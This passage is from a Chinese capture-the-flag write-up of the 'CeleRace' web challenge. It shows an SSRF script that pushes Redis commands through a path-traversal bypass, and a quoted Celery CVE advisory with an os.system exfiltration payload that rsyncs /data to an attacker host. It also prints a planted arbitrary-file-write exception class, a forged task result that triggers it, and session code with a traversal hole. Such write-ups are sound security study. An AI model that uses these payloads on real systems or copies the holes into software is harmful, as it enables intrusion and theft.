<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user default on nopass ~* &amp;* +@all -SAVE -SLAVEOF -MODULE -CONFIG -MONITOR -CLIENT</span><br></pre></td></tr></table></figure>

<p>redis_ssrf.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">TARGET = <span class="string">&quot;http://localhost:5001&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_post</span>(<span class="params">path: <span class="built_in">str</span>, json_body: <span class="built_in">dict</span>, cookies: <span class="built_in">dict</span> | <span class="literal">None</span> = <span class="literal">None</span></span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">    r = requests.post(</span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;TARGET&#125;</span><span class="subst">&#123;path&#125;</span>&quot;</span>, json=json_body, cookies=cookies <span class="keyword">or</span> &#123;&#125;, timeout=<span class="number">5</span></span><br><span class="line">    )</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_get</span>(<span class="params">path: <span class="built_in">str</span>, cookies: <span class="built_in">dict</span> | <span class="literal">None</span> = <span class="literal">None</span></span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">    r = requests.get(<span class="string">f&quot;<span class="subst">&#123;TARGET&#125;</span><span class="subst">&#123;path&#125;</span>&quot;</span>, cookies=cookies <span class="keyword">or</span> &#123;&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">queue_fetch_via_bypass</span>(<span class="params"></span></span><br><span class="line"><span class="params">    url: <span class="built_in">str</span>, host: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>, body: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>, verb: <span class="built_in">str</span> = <span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    bypass_path = <span class="string">&quot;/tasks/fetch/%252e%252e/%252e%252e/x&quot;</span></span><br><span class="line">    payload = &#123;<span class="string">&quot;url&quot;</span>: url, <span class="string">&quot;verb&quot;</span>: verb&#125;</span><br><span class="line">    <span class="keyword">if</span> host <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        payload[<span class="string">&quot;host&quot;</span>] = host</span><br><span class="line">    <span class="keyword">if</span> body <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        payload[<span class="string">&quot;body&quot;</span>] = body</span><br><span class="line">    task = api_post(bypass_path, payload)</span><br><span class="line">    task_id = task[<span class="string">&quot;task_id&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        res = api_get(<span class="string">f&quot;/tasks/result?id=<span class="subst">&#123;task_id&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">if</span> res.get(<span class="string">&quot;state&quot;</span>) == <span class="string">&quot;SUCCESS&quot;</span>:</span><br><span class="line">            preview = res.get(<span class="string">&quot;result&quot;</span>, &#123;&#125;).get(<span class="string">&quot;preview&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] fetch preview bytes:&quot;</span>, res.get(<span class="string">&quot;result&quot;</span>, &#123;&#125;).get(<span class="string">&quot;bytes&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> preview</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;fetch task timeout&quot;</span>)</span><br><span class="line"></span><br><span class="line">queue_fetch_via_bypass(</span><br><span class="line">    <span class="string">&quot;http://127.0.0.1:6379/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;info\r\nquit\r\n&quot;</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>搜索 Celery 历史漏洞，发现 CVE-2021-23727，虽然当前版本已经修复，但只是要求 exc_type 必须为 Exception。正好发现 framework.app 里面有一个奇怪的 DiagnosticsPersistError，其他地方根本没有使用到，在 &#x2F;tmp&#x2F;debug 存在的情况下实例化该对象就可以往任意路径写入文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当任务失败时，失败信息会在后台进行序列化。在某些情况下，异常类只能从使用者的代码库中导入。在这种情况下，我们会重建异常类，以便在查询任务结果的进程中重新抛出错误。这在 #4836 中引入。如果重建的异常类型不是一个异常，这就是一个安全问题。如果未包含本补丁中的条件，攻击者可能通过在结果后端将任务结果设置为失败，并将 os 模块、system 函数作为异常类型，以及 payload rsync /data attacker@192.168.56.100:~/data 作为异常参数，从而注入远程代码执行指令，例如：json &#123; &quot;exc_module&quot;: &quot;os&quot;, &#x27;exc_type&#x27;: &quot;system&quot;, &quot;exc_message&quot;: &quot;rsync /data attacker@192.168.56.100:~/data&quot; &#125;根据我的分析，这个漏洞只有在生产者延迟了一个任务且该任务运行时间足够长以至于攻击者可以在执行过程中更改结果，并且生产者已轮询该任务的结果时才可能被利用。攻击者还必须获得结果后端的访问权限。该安全漏洞的严重性较低，但我们仍建议进行升级。</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DiagnosticsPersistError</span>(<span class="title class_ inherited__">RuntimeError</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Dormant exception used for development-time diagnostics persistence.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    _BASE_DIR = Path(os.environ.get(<span class="string">&quot;FRAMEWORK_DIAGNOSTICS_DIR&quot;</span>, <span class="string">&quot;/app/data&quot;</span>)).resolve()</span><br><span class="line">    _DEBUG_SENTINEL = Path(<span class="string">&quot;/tmp/debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, payload: <span class="built_in">str</span>, *args: <span class="type">Any</span>, **kwargs: <span class="type">Any</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>._DEBUG_SENTINEL.exists():</span><br><span class="line">            <span class="variable language_">self</span>._maybe_persist(payload)</span><br><span class="line">        <span class="built_in">super</span>().__init__(<span class="string">&quot;diagnostics capture failed&quot;</span>, *args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_maybe_persist</span>(<span class="params">self, payload: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        info = <span class="variable language_">self</span>._decode_payload(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> info:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        target = info.get(<span class="string">&quot;path&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> target:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        path = Path(target)</span><br><span class="line">        mode = <span class="built_in">str</span>(info.get(<span class="string">&quot;mode&quot;</span>, <span class="string">&quot;w&quot;</span>))</span><br><span class="line">        encoding = info.get(<span class="string">&quot;encoding&quot;</span>, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        data = info.get(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            path.parent.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;b&quot;</span> <span class="keyword">in</span> mode:</span><br><span class="line">                blob = <span class="variable language_">self</span>._ensure_bytes(data, encoding)</span><br><span class="line">                <span class="keyword">with</span> path.<span class="built_in">open</span>(mode) <span class="keyword">as</span> fh:  <span class="comment"># type: ignore[call-arg]</span></span><br><span class="line">                    fh.write(blob)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                text = <span class="variable language_">self</span>._ensure_text(data, encoding)</span><br><span class="line">                <span class="keyword">with</span> path.<span class="built_in">open</span>(mode, encoding=encoding) <span class="keyword">as</span> fh:</span><br><span class="line">                    fh.write(text)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_decode_payload</span>(<span class="params">self, payload: <span class="built_in">str</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>] | <span class="literal">None</span>:</span><br><span class="line">        attempts = [payload]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            attempts.append(<span class="built_in">bytes</span>.fromhex(payload).decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> candidate <span class="keyword">in</span> attempts:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> json.loads(candidate)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_ensure_bytes</span>(<span class="params">self, data: <span class="type">Any</span>, encoding: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>):</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">            <span class="keyword">if</span> encoding == <span class="string">&quot;base64&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> base64.b64decode(data)</span><br><span class="line">            <span class="keyword">return</span> data.encode(encoding)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_ensure_text</span>(<span class="params">self, data: <span class="type">Any</span>, encoding: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">            <span class="keyword">if</span> encoding == <span class="string">&quot;base64&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> base64.b64decode(data).decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>):</span><br><span class="line">            <span class="keyword">return</span> data.decode(encoding, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br></pre></td></tr></table></figure>

<p>于是可以往 Redis 里面写入一个任务的执行结果，status 设置为 FAILURE，result 如下设置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;exc_type&quot;: &quot;DiagnosticsPersistError&quot;,</span><br><span class="line">    &quot;exc_message&quot;: json.dumps(</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;path&quot;: &quot;/tmp/test&quot;,</span><br><span class="line">            &quot;content&quot;: &quot;123&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">    ),</span><br><span class="line">    &quot;exc_module&quot;: &quot;framework.app&quot;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过 <code>task_result</code> 接口查询该任务的执行结果时，DiagnosticsPersistError 就会被实例化，在 <code>/tmp/debug</code> 存在的情况下，<code>/tmp/test</code> 会被写入 <code>123</code>。</p>
<p>接着需要解决的问题是如何创建 <code>/tmp/debug</code>。</p>
<p>注意到框架处理 Session 时存在目录穿越漏洞，当 sid 中存在 <code>../</code> 时，Session 文件会从 self.directory 中穿越出去，由此可以创建 <code>/tmp/debug</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FileSessionManager</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Manage loading and storing of file-based sessions.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret: <span class="built_in">str</span> = <span class="string">&quot;devsecret&quot;</span>, directory: <span class="built_in">str</span> = <span class="string">&quot;/tmp/sess&quot;</span>, cookie_name: <span class="built_in">str</span> = <span class="string">&quot;mini_session&quot;</span>, nonce_bytes: <span class="built_in">int</span> = <span class="number">8</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.secret = secret.encode() <span class="keyword">if</span> <span class="built_in">isinstance</span>(secret, <span class="built_in">str</span>) <span class="keyword">else</span> secret</span><br><span class="line">        <span class="variable language_">self</span>.directory = directory</span><br><span class="line">        <span class="variable language_">self</span>.cookie_name = cookie_name</span><br><span class="line">        <span class="variable language_">self</span>.nonce_bytes = nonce_bytes</span><br><span class="line">        os.makedirs(<span class="variable language_">self</span>.directory, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># -- public API -----------------------------------------------------</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load_session</span>(<span class="params">self, request: Request</span>) -&gt; FileSession:</span><br><span class="line">        sid, created = <span class="variable language_">self</span>._get_or_create_sid(request)</span><br><span class="line">        data = <span class="variable language_">self</span>._read(sid) <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">        session = FileSession(<span class="variable language_">self</span>, sid, sid, data=data, new=<span class="keyword">not</span> <span class="built_in">bool</span>(data))</span><br><span class="line">        session.cookie_needs_update = created</span><br><span class="line">        <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save</span>(<span class="params">self, session: FileSession</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session.modified:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        path = <span class="variable language_">self</span>._session_path(session.sid)</span><br><span class="line">        tmp_path = <span class="string">f&quot;<span class="subst">&#123;path&#125;</span>.tmp-<span class="subst">&#123;secrets.token_hex(<span class="number">4</span>)&#125;</span>&quot;</span></span><br><span class="line">        payload = &#123;key: value <span class="keyword">for</span> key, value <span class="keyword">in</span> session.items()&#125;</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(tmp_path, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fh:</span><br><span class="line">            json.dump(payload, fh, ensure_ascii=<span class="literal">False</span>, separators=(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;:&quot;</span>))</span><br><span class="line">        os.replace(tmp_path, path)</span><br><span class="line">        session.modified = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_cookie_value</span>(<span class="params">self, session: FileSession</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> session.nonce</span><br><span class="line"></span><br><span class="line">    <span class="comment"># -- internal helpers ----------------------------------------------</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_or_create_sid</span>(<span class="params">self, request: Request</span>) -&gt; <span class="built_in">tuple</span>[<span class="built_in">str</span>, <span class="built_in">bool</span>]:</span><br><span class="line">        raw = request.cookies.get(<span class="variable language_">self</span>.cookie_name)</span><br><span class="line">        <span class="keyword">if</span> raw:</span><br><span class="line">            sid = <span class="variable language_">self</span>._normalize_sid(raw)</span><br><span class="line">            <span class="keyword">if</span> sid:</span><br><span class="line">                <span class="keyword">return</span> sid, <span class="literal">False</span></span><br><span class="line">        sid = secrets.token_hex(<span class="variable language_">self</span>.nonce_bytes)</span><br><span class="line">        <span class="keyword">return</span> sid, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_normalize_sid</span>(<span class="params">self, value: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span> | <span class="literal">None</span>:</span><br><span class="line">        sid = value.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sid:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(sid) &gt; <span class="number">256</span>:</span><br><span class="line">            sid = sid[:<span class="number">256</span>]</span><br><span class="line">        <span class="keyword">return</span> sid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_read</span>(<span class="params">self, sid: <span class="built_in">str</span></span>) -&gt; <span class="type">Optional</span>[<span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]]:</span><br><span class="line">        path = <span class="variable language_">self</span>._session_path(sid)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fh:</span><br><span class="line">                <span class="keyword">return</span> json.load(fh)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">except</span> json.JSONDecodeError:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_session_path</span>(<span class="params">self, sid: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> os.path.join(<span class="variable language_">self</span>.directory, <span class="string">f&quot;<span class="subst">&#123;sid&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>




















<p><a target="_blank" rel="noopener" href="http://gensokyo.cn/2025/10/19/celerace/">http://gensokyo.cn/2025/10/19/celerace/</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io">cheng_xing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io/2025/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-web/">https://sakuraraindrop.github.io/2025/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-web/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://sakuraraindrop.github.io" target="_blank">cheng_xing's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/include/">include</a><a class="post-meta__tags" href="/tags/spel/">spel</a><a class="post-meta__tags" href="/tags/celery/">celery</a><a class="post-meta__tags" href="/tags/php%E5%8C%BF%E5%90%8D%E7%B1%BB/">php匿名类</a></div><div class="post-share"><div class="social-share" data-image="/img/ltx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2025/11/01/%E4%B8%AD%E7%BA%A7ROP/" title="中级ROP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">中级ROP</div></div></div></a><a class="pagination-related  no-desc" href="/2025/11/05/0xGame2025/" title="0xGame2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">0xGame2025</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2025/08/17/LilCTF/" title="LilCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-17</div><div class="info-item-2">LilCTF</div></div></div></a><a class="pagination-related no-desc" href="/2025/09/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025/" title="湾区杯2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-08</div><div class="info-item-2">湾区杯2025</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cheng_xing</div><div class="author-info-description">web菜鸡修炼中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">78</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">163</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sakuraraindrop"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sakuraraindrop" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://space.bilibili.com/504596197" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#bbjv"><span class="toc-number">1.</span> <span class="toc-text">bbjv</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yamcs"><span class="toc-number">2.</span> <span class="toc-text">yamcs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SecretVault"><span class="toc-number">3.</span> <span class="toc-text">SecretVault</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezphp"><span class="toc-number">4.</span> <span class="toc-text">ezphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTer"><span class="toc-number">5.</span> <span class="toc-text">PTer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F"><span class="toc-number">6.</span> <span class="toc-text">日志系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#anime"><span class="toc-number">7.</span> <span class="toc-text">anime</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CeleRace"><span class="toc-number">8.</span> <span class="toc-text">CeleRace</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/26/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" title="请求走私">请求走私</a><time datetime="2025-12-26T07:09:00.000Z" title="发表于 2025-12-26 15:09:00">2025-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/23/BH25-USA-HTTP1-1-Must-Die/" title="BH25-USA-HTTP1.1-Must-Die">BH25-USA-HTTP1.1-Must-Die</a><time datetime="2025-12-23T11:20:15.000Z" title="发表于 2025-12-23 19:20:15">2025-12-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/06/hitctf2025/" title="hitctf2025">hitctf2025</a><time datetime="2025-12-06T05:59:58.000Z" title="发表于 2025-12-06 13:59:58">2025-12-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/02/BlackHat-MEA-2025-Final/" title="BlackHat-MEA-2025-Final">BlackHat-MEA-2025-Final</a><time datetime="2025-12-02T09:59:26.000Z" title="发表于 2025-12-02 17:59:26">2025-12-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" 